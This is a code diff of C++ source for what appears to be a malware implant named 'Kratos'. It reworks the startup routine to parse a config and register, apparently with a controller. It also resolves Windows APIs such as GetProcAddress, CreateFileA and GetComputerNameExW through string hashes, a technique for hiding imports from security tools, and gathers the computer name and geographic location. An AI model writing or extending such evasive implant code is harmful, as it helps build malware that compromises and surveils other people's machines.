@@ -2,6 +2,7 @@
 #include "packager/packager.h"
 #include "net/net.h"
 #include "modules/modules.h"
+#include "config/config.h"
 
 BOOL Kratos::Init() {
 
@@ -27,19 +28,15 @@ BOOL Kratos::Init() {
 	DEBUG_LOG("[+] Allocated packager,net modules");
 
 
-	if ( ! this->LoadConfig( ) ) {
-		DEBUG_LOG("[!] Failed loading config");
+	if( ! ParseConfig( ) ) {
 		return FALSE;
 	}
-	// if ( ! net->init( ) ) {
-	// 	DEBUG_LOG("[!] Failed network init");
-	// 	return FALSE;
-	// }
+	
 	if( ! this->Register( ) ) {
 		DEBUG_LOG("[!] Failed register");
 		return FALSE;
 	}
-	//Sleep(20000);
+	
 
 	
 	DEBUG_LOG("[*] Apis, Config, net init ran!");
@@ -58,12 +55,12 @@ BOOL Kratos::LoadApis( ) {
 		this->apis.GetProcAddress = ( decltype ( this->apis.GetProcAddress ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "GetProcAddress" ) );
 		this->apis.CloseHandle    = ( decltype ( this->apis.CloseHandle    ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "CloseHandle"    ) );
 
-		this->apis.LocalAlloc            = ( decltype ( this->apis.LocalAlloc   ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "LocalAlloc"   ) );
-		this->apis.LocalFree             = ( decltype ( this->apis.LocalFree    ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "LocalFree"    ) );
-		this->apis.LocalReAlloc          = ( decltype ( this->apis.LocalReAlloc ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "LocalReAlloc" ) );
-		this->apis.GetTickCount          = ( decltype ( this->apis.GetTickCount ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "GetTickCount" ) );
-		this->apis.CreateFileA           = ( decltype ( this->apis.CreateFileA  ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "CreateFileA"  ) );
-
+		this->apis.LocalAlloc            = ( decltype ( this->apis.LocalAlloc			 ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "LocalAlloc"		       ) );
+		this->apis.LocalFree             = ( decltype ( this->apis.LocalFree			 ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "LocalFree"			   ) );
+		this->apis.LocalReAlloc          = ( decltype ( this->apis.LocalReAlloc			 ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "LocalReAlloc"		   ) );
+		this->apis.GetTickCount          = ( decltype ( this->apis.GetTickCount			 ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "GetTickCount"		   ) );
+		this->apis.CreateFileA           = ( decltype ( this->apis.CreateFileA			 ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "CreateFileA"		   ) );
+		this->apis.MultiByteToWideChar   = ( decltype ( this->apis.MultiByteToWideChar   ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "MultiByteToWideChar"   ) );
 		this->apis.GetUserDefaultGeoName = ( decltype ( this->apis.GetUserDefaultGeoName ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "GetUserDefaultGeoName" ) );
 		this->apis.GetComputerNameExW    = ( decltype ( this->apis.GetComputerNameExW    ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "GetComputerNameExW"    ) );
 
@@ -114,7 +111,3 @@ BOOL Kratos::LoadApis( ) {
 	return TRUE;
 }
 
-BOOL Kratos::LoadConfig( ) {
-	DEBUG_LOG("[+] Loaded Config");
-	return TRUE;
-}
